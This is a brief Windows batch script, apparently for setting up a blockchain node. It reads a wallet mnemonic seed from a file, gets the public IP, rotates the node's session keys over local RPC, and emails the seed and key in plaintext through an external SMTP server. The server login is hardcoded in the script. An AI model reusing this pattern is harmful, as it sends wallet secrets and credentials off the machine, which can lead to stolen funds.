@echo off
:SendEmail
ping -n 3 127.0.0.1 > nul
set /p mnemoricSeedMail=< mnemoricSeed.txt
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a

FOR /F "tokens=* USEBACKQ" %%g IN (`curl.exe --request POST "http://localhost:8443" --header "Content-Type: application/json" --data-raw "{\"jsonrpc\": \"2.0\", \"method\": \"author_rotateKeys\", \"params\": [],\"id\": 1}"`) do (
	echo %%g > curlOut.txt
	(for /f "tokens=2,* delims=," %%a in (curlOut.txt) do echo %%a) > curlOutTR.txt
	(for /f "tokens=2,* delims=:" %%a in (curlOutTR.txt) do echo %%a) > curl.txt
)
set /p curlIn=< curl.txt
set curlIn=%curlIn:~1,-1% 
del curlOut.txt
del curlOutTR.txt
del curl.txt
IF "%curlIn%"=="" (
	goto SendEmail
) ELSE (
	cmail.exe -host:server35216:Ae54Tfz3CYc6y9D8@smtp.socketlabs.com:587 -starttls -to:teranyina@easyinnova.com -from:teranyina@easyinnova.com "-subject:New new node from %PublicIP%" "-body:Mnemoric seed: --%mnemoricSeedMail%-- Rotate key: --%curlIn%--."
)